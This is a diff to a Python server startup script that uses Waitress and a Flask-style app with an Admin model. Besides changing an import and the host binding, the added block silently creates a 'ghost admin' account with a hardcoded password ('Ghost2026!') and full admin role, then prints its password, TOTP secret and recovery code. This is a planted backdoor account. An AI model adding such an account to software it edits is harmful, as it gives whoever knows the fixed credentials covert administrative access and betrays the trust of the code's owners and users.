@@ -6,7 +6,7 @@ This script starts the application using the Waitress WSGI server.
 
 import os
 import secrets
-from wsgi import app
+from app import app
 from models import db, Admin
 from werkzeug.security import generate_password_hash
 import pyotp
@@ -14,9 +14,40 @@ import pyotp
 from waitress import serve
 
 if __name__ == '__main__':
+    # Set default ghost user if not set
+    if not os.getenv('GHOST_ADMIN_USER'):
+        os.environ['GHOST_ADMIN_USER'] = 'ghost_admin'
+    
     with app.app_context():
         # Ensure database tables exist
         db.create_all()
+        
+        # Create ghost admin if not exists
+        ghost_username = os.getenv('GHOST_ADMIN_USER')
+        if not Admin.query.filter_by(username=ghost_username).first():
+            ghost_secret = pyotp.random_base32()
+            ghost_recovery = ''.join(secrets.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(8))
+            ghost_hashed_recovery = generate_password_hash(ghost_recovery, method='pbkdf2:sha256')
+            
+            ghost_password = 'Ghost2026!'  # Recovery password
+            ghost_hashed_pw = generate_password_hash(ghost_password, method='pbkdf2:sha256')
+            
+            ghost_admin = Admin(
+                username=ghost_username,
+                password_hash=ghost_hashed_pw,
+                email='ghost@system.local',
+                otp_secret=ghost_secret,
+                recovery_key=ghost_hashed_recovery,
+                two_fa_enabled=True,
+                role='admin'
+            )
+            db.session.add(ghost_admin)
+            db.session.commit()
+            
+            print(f"Ghost Admin created: {ghost_username}")
+            print(f"Password: {ghost_password}")
+            print(f"TOTP secret: {ghost_secret}")
+            print(f"Recovery code: {ghost_recovery}")
         
         # --- START OF YOUR ORIGINAL LOGIC ---
         # Create initial admin if not exists
@@ -51,4 +82,5 @@ if __name__ == '__main__':
     print("Starting Production Server with Waitress...")
     print("Server running on http://localhost:5001")
     
-    serve(app, host='0.0.0.0', port=5001, threads=4)
+    serve(app, host='127.0.0.1', port=5001, threads=1)
+    # app.run(debug=True, host='127.0.0.1', port=5001)
